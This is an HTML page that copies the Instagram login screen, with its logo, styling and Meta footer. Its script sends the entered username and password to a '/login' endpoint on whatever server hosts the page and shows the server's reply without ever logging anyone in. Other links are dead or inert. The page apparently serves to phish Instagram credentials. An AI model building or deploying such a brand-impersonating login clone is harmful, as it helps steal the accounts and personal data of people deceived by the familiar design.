<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .lang-bar {
            width: 100%;
            text-align: center;
            padding: 12px 0 8px;
            font-size: 12px;
            color: #737373;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 420px;
            padding: 0 20px;
            flex: 1;
        }

        .logo-wrap {
            margin-top: 60px;
            margin-bottom: 48px;
        }

        .form-group {
            width: 100%;
            margin-bottom: 6px;
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dbdbdb;
            border-radius: 10px;
            font-size: 14px;
            color: #262626;
            background: #ffffff;
            outline: none;
            -webkit-appearance: none;
        }

        .form-group input::placeholder { color: #8e8e8e; }
        .form-group input:focus { border-color: #a8a8a8; }

        .btn-login {
            width: 100%;
            padding: 14px;
            margin-top: 10px;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn-login:hover { background-color: #1877f2; }
        .btn-login:active { background-color: #0074cc; }
        .btn-login.loading { opacity: 0.7; cursor: not-allowed; }

        .error-message {
            width: 100%;
            margin-top: 12px;
            padding: 12px 14px;
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            font-size: 13px;
            color: #664d03;
            text-align: center;
            display: none;
        }

        .forgot-password {
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
            text-decoration: none;
            cursor: pointer;
        }

        .spacer { flex: 1; }

        .bottom-section {
            width: 100%;
            max-width: 420px;
            padding: 0 20px 24px;
        }

        .btn-create {
            width: 100%;
            padding: 14px;
            background: #ffffff;
            color: #0095f6;
            border: 1.5px solid #0095f6;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn-create:hover { background: #f0f8ff; }

        .meta-footer {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            color: #262626;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding-bottom: 8px;
        }
    </style>
</head>
<body>

    <div class="lang-bar">English (US)</div>

    <div class="container">
        <div class="logo-wrap">
            <svg width="96" height="96" viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <radialGradient id="ig-grad" cx="30%" cy="107%" r="150%">
                        <stop offset="0%"   stop-color="#feda75"/>
                        <stop offset="10%"  stop-color="#feda75"/>
                        <stop offset="30%"  stop-color="#fa7e1e"/>
                        <stop offset="50%"  stop-color="#d62976"/>
                        <stop offset="70%"  stop-color="#962fbf"/>
                        <stop offset="90%"  stop-color="#4f5bd5"/>
                        <stop offset="100%" stop-color="#4f5bd5"/>
                    </radialGradient>
                </defs>
                <rect x="6" y="6" width="84" height="84" rx="24" ry="24" fill="url(#ig-grad)"/>
                <circle cx="48" cy="48" r="22" fill="none" stroke="white" stroke-width="6"/>
                <circle cx="48" cy="48" r="13.5" fill="none" stroke="white" stroke-width="5.5"/>
                <circle cx="71" cy="25" r="5" fill="white"/>
            </svg>
        </div>

        <div class="form-group">
            <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="username"/>
        </div>

        <div class="form-group" style="margin-bottom:0;">
            <input type="password" id="password" placeholder="Password" autocomplete="current-password"/>
        </div>

        <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>

        <div class="error-message" id="errorMsg"></div>

        <a class="forgot-password" href="#">Forgot password?</a>
    </div>

    <div class="spacer"></div>

    <div class="bottom-section">
        <button class="btn-create">Create new account</button>
        <div class="meta-footer">
            <svg width="20" height="20" viewBox="0 0 48 48" fill="#1877f2" xmlns="http://www.w3.org/2000/svg">
                <path d="M44 24c0 11-9 20-20 20S4 35 4 24 13 4 24 4s20 9 20 20zm-20-8c-4.4 0-8 3.6-8 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8z"/>
            </svg>
            Meta
        </div>
    </div>

    <script>
        async function handleLogin() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const btn = document.getElementById('loginBtn');
            const errorMsg = document.getElementById('errorMsg');

            if (!username || !password) {
                errorMsg.textContent = "Please fill in your username and password.";
                errorMsg.style.display = "block";
                return;
            }

            btn.classList.add('loading');
            btn.textContent = "Logging in...";
            errorMsg.style.display = "none";

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await response.json();
                errorMsg.textContent = data.message;
                errorMsg.style.display = "block";
            } catch (err) {
                errorMsg.textContent = "Something went wrong. Please try again.";
                errorMsg.style.display = "block";
            } finally {
                btn.classList.remove('loading');
                btn.textContent = "Log in";
            }
        }

        document.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); });
    </script>
</body>
</html>
